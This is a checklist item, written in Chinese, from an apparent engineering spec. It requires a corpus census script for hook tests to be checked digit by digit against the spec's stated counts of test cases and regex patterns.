- [ ] SC-18 (**权威计数器自身被断言**, R4→R5 code-reviewer M-3 三轮未落): 跑 `python3 aria/hooks/tests/corpus_census.py`, 其输出与 spec 正文**逐数字机械比对**, 任一不一致即失败 ——
  - 语料面: `65 / 49 / 16 / 15 / 1` + 换行边界 `5 (4 拦 + 1 放)` (§Impact 迁移面 / SC-2 / SC-3 的基数全部引用它)
  - 判据面 (§6 新增口径): 13 处判据行号清单恰 **13** 条 · `[[:space:]]+` **10** 处 / `[[:space:]]*` **12** 处 / 含 `[[:space:]]` **13** 处 · 换行影响面**两个基线口径各一个数** (严格 **11/13**、宽松 **13/13**)
  - pattern 量词面 (owner 2026-08-09 采 B-4, 转出 1 的工作面基数): pattern 总数 **141** (单引号 **139** + 双引号 **2**) · 含 `[^|]` **81** · `[^|]*` **79** · `[^|]+` **7** · 两者兼有 **5** · `.*` **1**
  - SC-3 有效面 (采 B-10): 输出 49 条 `expected=2` 含边界用例的**用例名清单**, 供 SC-3 逐条比对
  - **为什么必须有**: 这个计数器是 SC-2/SC-3 基数的唯一来源, 它算错一次就成为「权威的错答案」; 而同一份 spec 已为 `secret-hygiene.md` 的计数专门配了 SC-13, 计数器自己却三轮无断言 —— 不对称。
  - **反事实**: 计数器实现漂移 (如 quote-aware 状态机改坏) → 本 SC 红; 若无本 SC, 它只会让 SC-2/SC-3 的基数静默变错而**没有任何 SC 转红**
